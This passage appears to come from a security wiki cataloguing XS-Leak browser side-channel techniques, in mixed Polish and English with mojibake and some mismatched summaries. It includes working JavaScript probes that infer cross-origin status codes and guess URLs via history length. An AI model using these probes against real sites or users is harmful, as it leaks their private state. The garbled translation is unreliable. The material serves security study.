## Techniki API wydajnoci

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) oferuje wgld w metryki wydajnoci aplikacji internetowych, dodatkowo wzbogacony przez [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API). Resource Timing API umo偶liwia monitorowanie szczeg贸owych czas贸w 偶da sieciowych, takich jak czas trwania 偶da. W szczeg贸lnoci, gdy serwery doczaj nag贸wek `Timing-Allow-Origin: *` do swoich odpowiedzi, dodatkowe dane, takie jak rozmiar transferu i czas wyszukiwania domeny, staj si dostpne.

Ta bogata baza danych mo偶e by pobierana za pomoc metod takich jak [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) lub [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), zapewniajc kompleksowy widok informacji zwizanych z wydajnoci. Dodatkowo, API uatwia pomiar czas贸w wykonania, obliczajc r贸偶nic midzy znacznikami czasu uzyskanymi z [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Warto jednak zauwa偶y, 偶e dla niekt贸rych operacji w przegldarkach takich jak Chrome, precyzja `performance.now()` mo偶e by ograniczona do milisekund, co mo偶e wpyn na szczeg贸owo pomiar贸w czasowych.

Poza pomiarami czasowymi, API wydajnoci mo偶e by wykorzystywane do uzyskiwania informacji zwizanych z bezpieczestwem. Na przykad, obecno lub brak stron w obiekcie `performance` w Chrome mo偶e wskazywa na zastosowanie `X-Frame-Options`. W szczeg贸lnoci, jeli strona jest zablokowana przed renderowaniem w ramce z powodu `X-Frame-Options`, nie zostanie zarejestrowana w obiekcie `performance`, co stanowi subtelny wskaz贸wk na temat polityki ramkowania strony.

### Wyciek bdu

* **Metody wczenia**: Ramki, Elementy HTML
* **Wykrywalna r贸偶nica**: Kod statusu
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie:** 呕danie, kt贸re koczy si bdami, nie utworzy wpisu czasowego zasob贸w.
* **Przykad kodu**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Mo偶liwe jest **rozr贸偶nienie midzy kodami statusu odpowiedzi HTTP**, poniewa偶 偶dania, kt贸re prowadz do **bdu**, **nie tworz wpisu wydajnoci**.

### Bd przeadowania stylu

* **Metody wczenia**: Elementy HTML
* **Wykrywalna r贸偶nica**: Kod statusu
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie:** Z powodu bdu przegldarki, 偶dania, kt贸re kocz si bdami, s adowane dwukrotnie.
* **Przykad kodu**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

W poprzedniej technice zidentyfikowano r贸wnie偶 dwa przypadki, w kt贸rych bdy przegldarki w GC prowadz do **adowania zasob贸w dwukrotnie, gdy nie udaje si ich zaadowa**. To spowoduje wiele wpis贸w w API wydajnoci i mo偶e by zatem wykryte.

### Bd czenia 偶da

* **Metody wczenia**: Elementy HTML
* **Wykrywalna r贸偶nica**: Kod statusu
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie:** 呕dania, kt贸re kocz si bdem, nie mog by scalane.
* **Przykad kodu**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Technika ta zostaa znaleziona w tabeli w wspomnianym dokumencie, ale nie znaleziono opisu techniki. Mo偶esz jednak znale藕 kod 藕r贸dowy sprawdzajcy to w [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Wyciek pustej strony

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie:** Puste odpowiedzi nie tworz wpis贸w czasowych zasob贸w.
* **Przykad kodu**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Atakujcy mo偶e wykry, czy 偶danie zakoczyo si pustym ciaem odpowiedzi HTTP, poniewa偶 **puste strony nie tworz wpisu wydajnoci w niekt贸rych przegldarkach**.

### **Wyciek XSS-Auditor**

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie:** U偶ywajc XSS Audytora w Asercjach Bezpieczestwa, atakujcy mog wykrywa konkretne elementy stron internetowych, obserwujc zmiany w odpowiedziach, gdy skonstruowane adunki wyzwalaj mechanizm filtrowania audytora.
* **Przykad kodu**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

W Asercjach Bezpieczestwa (SA) XSS Auditor, pierwotnie zaprojektowany w celu zapobiegania atakom Cross-Site Scripting (XSS), mo偶e paradoksalnie by wykorzystywany do wycieku wra偶liwych informacji. Chocia偶 ta wbudowana funkcja zostaa usunita z Google Chrome (GC), nadal jest obecna w SA. W 2013 roku Braun i Heiderich wykazali, 偶e XSS Auditor m贸g nieumylnie blokowa legalne skrypty, prowadzc do faszywych pozytyw贸w. Na tym tle badacze opracowali techniki wydobywania informacji i wykrywania konkretnych treci na stronach z innego 藕r贸da, koncepcja znana jako XS-Leaks, pierwotnie zgoszona przez Terad i rozwinita przez Heyesa w pocie na blogu. Chocia偶 te techniki byy specyficzne dla XSS Audytora w GC, odkryto, 偶e w SA strony zablokowane przez XSS Audytora nie generuj wpis贸w w API wydajnoci, ujawniajc metod, dziki kt贸rej wra偶liwe informacje mog by nadal wyciekane.

### Wyciek X-Frame

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Nag贸wek
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Podsumowanie:** Zas贸b z nag贸wkiem X-Frame-Options nie tworzy wpisu czasowego zasob贸w.
* **Przykad kodu**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Jeli strona **nie jest dozwolona** do **renderowania** w **iframe**, nie tworzy **wpisu wydajnoci**. W rezultacie atakujcy mo偶e wykry nag贸wek odpowiedzi **`X-Frame-Options`**.\
To samo dotyczy u偶ycia tagu **embed**.

### Wykrywanie pobierania

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Nag贸wek
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie:** Pobrania nie tworz wpis贸w czasowych zasob贸w w API wydajnoci.
* **Przykad kodu**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Podobnie jak w opisanym XS-Leak, **zas贸b, kt贸ry jest pobierany** z powodu nag贸wka ContentDisposition, r贸wnie偶 **nie tworzy wpisu wydajnoci**. Ta technika dziaa we wszystkich g贸wnych przegldarkach.

### Wyciek czasu rozpoczcia przekierowania

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Przekierowanie
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie:** Wpis czasowy zasob贸w ujawnia czas rozpoczcia przekierowania.
* **Przykad kodu**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Znale藕limy jeden przypadek XS-Leak, kt贸ry wykorzystuje zachowanie niekt贸rych przegldarek, kt贸re rejestruj zbyt wiele informacji dla 偶da z innego 藕r贸da. Standard definiuje podzbi贸r atrybut贸w, kt贸re powinny by ustawione na zero dla zasob贸w z innego 藕r贸da. Jednak w **SA** mo偶liwe jest wykrycie, czy u偶ytkownik jest **przekierowywany** przez stron docelow, zapytujc API **Performance API** i sprawdzajc dane czasowe **redirectStart**.

### Wyciek czasu trwania przekierowania

* **Metody wczenia**: Fetch API
* **Wykrywalna r贸偶nica**: Przekierowanie
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie:** Czas trwania wpis贸w czasowych jest ujemny, gdy wystpuje przekierowanie.
* **Przykad kodu**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

W GC **czas trwania** dla 偶da, kt贸re kocz si **przekierowaniem**, jest **ujemny** i mo偶na go zatem **rozr贸偶ni** od 偶da, kt贸re nie kocz si przekierowaniem.

### Wyciek CORP

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Nag贸wek
* **Wicej informacji**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Podsumowanie:** Zas贸b chroniony przez CORP nie tworzy wpis贸w czasowych zasob贸w.
* **Przykad kodu**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

W niekt贸rych przypadkach **wpis nextHopProtocol** mo偶e by u偶ywany jako technika wycieku. W GC, gdy nag贸wek **CORP** jest ustawiony, nextHopProtocol bdzie **pusty**. Nale偶y zauwa偶y, 偶e SA w og贸le nie utworzy wpisu wydajnoci dla zasob贸w z wczonym CORP.

### Serwis Worker

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: U偶ycie API
* **Wicej informacji**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Podsumowanie:** Wykrywanie, czy serwis worker jest zarejestrowany dla konkretnego 藕r贸da.
* **Przykad kodu**:

Serwis worker to kontekst skryptu wywoywanego przez zdarzenia, kt贸ry dziaa w danym 藕r贸dle. Dziaa w tle strony internetowej i mo偶e przechwytywa, modyfikowa i **buforowa zasoby**, aby stworzy offline'ow aplikacj internetow.\
Jeli **zas贸b buforowany** przez **serwis worker** jest dostpny przez **iframe**, zas贸b zostanie **zaadowany z pamici podrcznej serwis worker**.\
Aby wykry, czy zas贸b zosta **zaadowany z pamici podrcznej serwis worker**, mo偶na u偶y **API wydajnoci**.\
Mo偶na to r贸wnie偶 zrobi za pomoc ataku czasowego (sprawd藕 dokument, aby uzyska wicej informacji).

### Pami podrczna

* **Metody wczenia**: Fetch API
* **Wykrywalna r贸偶nica**: Czas
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Podsumowanie:** Mo偶liwe jest sprawdzenie, czy zas贸b zosta zapisany w pamici podrcznej.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Korzystajc z [API wydajnoci](xs-search.md#performance-api), mo偶liwe jest sprawdzenie, czy zas贸b jest buforowany.

### Czas trwania sieci

* **Metody wczenia**: Fetch API
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Podsumowanie:** Mo偶liwe jest uzyskanie czasu trwania sieci 偶dania z API `performance`.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Technika komunikat贸w o bdach

### Bd multimedi贸w

* **Metody wczenia**: Elementy HTML (Wideo, Audio)
* **Wykrywalna r贸偶nica**: Kod statusu
* **Wicej informacji**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Podsumowanie:** W Firefoxie mo偶liwe jest dokadne wyciekanie kodu statusu 偶dania z innego 藕r贸da.
* **Przykad kodu**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
The `MediaError` interface's message property uniquely identifies resources that load successfully with a distinct string. An attacker can exploit this feature by observing the message content, thereby deducing the response status of a cross-origin resource.

### CORS Error

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Summary:** W Security Assertions (SA) komunikaty o bdach CORS nieumylnie ujawniaj peny URL przekierowanych 偶da.
* **Code Example**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

This technique enables an attacker to **extract the destination of a cross-origin site's redirect** by exploiting how Webkit-based browsers handle CORS requests. Specifically, when a **CORS-enabled request** is sent to a target site that issues a redirect based on user state and the browser subsequently denies the request, the **full URL of the redirect's target** is disclosed within the error message. This vulnerability not only reveals the fact of the redirect but also exposes the redirect's endpoint and any **sensitive query parameters** it may contain.

### SRI Error

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Summary:** W Security Assertions (SA) komunikaty o bdach CORS nieumylnie ujawniaj peny URL przekierowanych 偶da.
* **Code Example**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

An attacker can exploit **verbose error messages** to deduce the size of cross-origin responses. This is possible due to the mechanism of Subresource Integrity (SRI), which uses the integrity attribute to validate that resources fetched, often from CDNs, haven't been tampered with. For SRI to work on cross-origin resources, these must be **CORS-enabled**; otherwise, they're not subject to integrity checks. In Security Assertions (SA), much like the CORS error XS-Leak, an error message can be captured after a fetch request with an integrity attribute fails. Attackers can deliberately **trigger this error** by assigning a **bogus hash value** to the integrity attribute of any request. In SA, the resulting error message inadvertently reveals the content length of the requested resource. This information leakage allows an attacker to discern variations in response size, paving the way for sophisticated XS-Leak attacks.

### CSP Violation/Detection

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Status Code
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Summary:** Zezwalajc tylko na stron ofiary w CSP, jeli pr贸buje przekierowa na inna domen, CSP wywoa wykrywalny bd.
* **Code Example**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

A XS-Leak can use the CSP to detect if a cross-origin site was redirected to a different origin. This leak can detect the redirect, but additionally, the domain of the redirect target leaks. The basic idea of this attack is to **allow the target domain on the attacker site**. Once a request is issued to the target domain, it **redirects** to a cross-origin domain. **CSP blocks** the access to it and creates a **violation report used as a leak technique**. Depending on the browser, **this report may leak the target location of the redirect**.\
Modern browsers won't indicate the URL it was redirected to, but you can still detect that a cross-origin redirect was triggered.

### Cache

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Summary:** Wyczy plik z pamici podrcznej. Otwiera stron docelow, sprawdza, czy plik jest obecny w pamici podrcznej.
* **Code Example:**

Browsers might use one shared cache for all websites. Regardless of their origin, it is possible to deduct whether a target page has **requested a specific file**.

If a page loads an image only if the user is logged in, you can **invalidate** the **resource** (so it's no longer cached if it was, see more info links), **perform a request** that could load that resource and try to load the resource **with a bad request** (e.g. using an overlong referer header). If the resource load **didn't trigger any error**, it's because it was **cached**.

### CSP Directive

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Summary:** Dyrektywy nag贸wka CSP mog by badane za pomoc atrybutu iframe CSP, ujawniajc szczeg贸y polityki.
* **Code Example**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

A novel feature in Google Chrome (GC) allows web pages to **propose a Content Security Policy (CSP)** by setting an attribute on an iframe element, with policy directives transmitted along with the HTTP request. Normally, the embedded content must **authorize this via an HTTP header**, or an **error page is displayed**. However, if the iframe is already governed by a CSP and the newly proposed policy isn't more restrictive, the page will load normally. This mechanism opens a pathway for an attacker to **detect specific CSP directives** of a cross-origin page by identifying the error page. Although this vulnerability was marked as fixed, our findings reveal a **new leak technique** capable of detecting the error page, suggesting that the underlying problem was never fully addressed.

### **CORP**

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Summary:** Zasoby zabezpieczone polityk Cross-Origin Resource Policy (CORP) zgosz bd, gdy bd pobierane z niedozwolonego pochodzenia.
* **Code Example**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

The CORP header is a relatively new web platform security feature that when set b**locks no-cors cross-origin requests to the given resource**. The presence of the header can be detected, because a resource protected with CORP will **throw an error when fetched**.

### CORB

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Summary**: CORB can allow attackers to detect when the **`nosniff` header is present** in the request.
* **Code Example**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Check the link for more information about the attack.

### CORS error on Origin Reflection misconfiguration <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Summary**: Jeli nag贸wek Origin jest odzwierciedlany w nag贸wku `Access-Control-Allow-Origin`, mo偶liwe jest sprawdzenie, czy zas贸b jest ju偶 w pamici podrcznej.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

In case the **Origin header** is being **reflected** in the header `Access-Control-Allow-Origin` an attacker can abuse this behaviour to try to **fetch** the **resource** in **CORS** mode. If an **error** **isn't** triggered, it means that it was **correctly retrieved form the web**, if an error is **triggered**, it's because it was **accessed from the cache** (the error appears because the cache saves a response with a CORS header allowing the original domain and not the attackers domain)**.**\
Note that if the origin isn't reflected but a wildcard is used (`Access-Control-Allow-Origin: *`) this won't work.

## Readable Attributes Technique

### Fetch Redirect

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Status Code
* **More info**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Summary:** GC i SA pozwalaj sprawdzi typ odpowiedzi (opaque-redirect) po zakoczeniu przekierowania.
* **Code Example**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Submitting a request using the Fetch API with `redirect: "manual"` and other params, it's possible to read the `response.type` attribute and if it's equals to `opaqueredirect` then the response was a redirect.

### COOP

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Summary:** Strony zabezpieczone polityk Cross-Origin Opener Policy (COOP) zapobiegaj dostpowi z interakcji midzy r贸偶nymi pochodzeniami.
* **Code Example**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

An attacker is capable of deducing the presence of the Cross-Origin Opener Policy (COOP) header in a cross-origin HTTP response. COOP is utilized by web applications to hinder external sites from obtaining arbitrary window references. The visibility of this header can be discerned by attempting to access the **`contentWindow` reference**. In scenarios where COOP is applied conditionally, the **`opener` property** becomes a telltale indicator: it's **undefined** when COOP is active, and **defined** in its absence.

### URL Max Length - Server Side

* **Inclusion Methods**: Fetch API, HTML Elements
* **Detectable Difference**: Status Code / Content
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Summary:** Wykryj r贸偶nice w odpowiedziach, poniewa偶 dugo odpowiedzi przekierowania mo偶e by zbyt du偶a, co powoduje, 偶e serwer odpowiada bdem i generowany jest alert.
* **Code Example**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

If a server-side redirect uses **user input inside the redirection** and **extra data**. It's possible to detect this behaviour because usually **servers** has a **limit request length**. If the **user data** is that **length - 1**, because the **redirect** is using **that data** and **adding** something **extra**, it will trigger an **error detectable via Error Events**.

If you can somehow set cookies to a user, you can also perform this attack by **setting enough cookies** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) so with the **response increased size** of the **correct response** an **error** is triggered. In this case, remember that is you trigger this request from a same site, `<script>` will automatically send the cookies (so you can check for errors).\
An example of the **cookie bomb + XS-Search** can be found in the Intended solution of this writeup: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` or to be in the same context is usually needed for this type of attack.

### URL Max Length - Client Side

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Status Code / Content
* **More info**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Summary:** Wykryj r贸偶nice w odpowiedziach, poniewa偶 dugo odpowiedzi przekierowania mo偶e by zbyt du偶a, aby mo偶na byo zauwa偶y r贸偶nic.
* **Code Example**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

According to [Chromium documentation](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), Chrome's maximum URL length is 2MB.

> In general, the _web platform_ does not have limits on the length of URLs (although 2^31 is a common limit). _Chrome_ limits URLs to a maximum length of **2MB** for practical reasons and to avoid causing denial-of-service problems in inter-process communication.

Therefore if the **redirect URL responded is larger in one of the cases**, it's possible to make it redirect with a **URL larger than 2MB** to hit the **length limit**. When this happens, Chrome shows an **`about:blank#blocked`** page.

The **noticeable difference**, is that if the **redirect** was **completed**, `window.origin` throws an **error** because a cross origin cannot access that info. However, if the **limit** was \*\*\*\* hit and the loaded page was **`about:blank#blocked`** the window's **`origin`** remains that of the **parent**, which is an **accessible information.**

All the extra info needed to reach the **2MB** can be added via a **hash** in the initial URL so it will be **used in the redirect**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### Max Redirects

* **Inclusion Methods**: Fetch API, Frames
* **Detectable Difference**: Status Code
* **More info**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Summary:** U偶yj limitu przekierowa przegldarki, aby ustali wystpienie przekierowa URL.
* **Code Example**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

If the **max** number of **redirects** to follow of a browser is **20**, an attacker could try to load his page with **19 redirects** and finally **send the victim** to the tested page. If an **error** is triggered, then the page was trying to **redirect the victim**.

### History Length

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Redirects
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Summary:** Kod JavaScript manipuluje histori przegldarki i mo偶e by dostpny za pomoc waciwoci length.
* **Code Example**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

The **History API** allows JavaScript code to manipulate the browser history, which **saves the pages visited by a user**. An attacker can use the length property as an inclusion method: to detect JavaScript and HTML navigation.\
**Checking `history.length`**, making a user **navigate** to a page, **change** it **back** to the same-origin and **checking** the new value of **`history.length`**.

### History Length with same URL

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: If URL is the same as the guessed one
* **Summary:** Mo偶liwe jest zgadywanie, czy lokalizacja ramki/popupu znajduje si w okrelonym URL, nadu偶ywajc dugoci historii.
* **Code Example**: Below

An attacker could use JavaScript code to **manipulate the frame/pop-up location to a guessed one** and **immediately** **change it to `about:blank`**. If the history length increased it means the URL was correct and it had time to **increase because the URL isn't reloaded if it's the same**. If it didn't increased it means it **tried to load the guessed URL** but because we **immediately after** loaded **`about:blank`**, the **history length did never increase** when loading the guessed url.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Liczenie ramek

* **Metody wczenia**: Ramki, Pop-upy
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Podsumowanie:** Oce ilo element贸w iframe, sprawdzajc waciwo `window.length`.
* **Przykad kodu**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Liczenie **liczby ramek w sieci** otwartych za pomoc `iframe` lub `window.open` mo偶e pom贸c w identyfikacji **statusu u偶ytkownika na tej stronie**.\
Ponadto, jeli strona ma zawsze t sam liczb ramek, cige sprawdzanie liczby ramek mo偶e pom贸c w identyfikacji **wzoru**, kt贸ry mo偶e ujawnia informacje.

Przykadem tej techniki jest to, 偶e w Chrome **PDF** mo偶e by **wykrywany** za pomoc **liczenia ramek**, poniewa偶 wewntrznie u偶ywany jest `embed`. Istniej [Parametry URL](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113), kt贸re pozwalaj na pewn kontrol nad zawartoci, tak jak `zoom`, `view`, `page`, `toolbar`, gdzie ta technika mo偶e by interesujca.

### Elementy HTML

* **Metody wczenia**: Elementy HTML
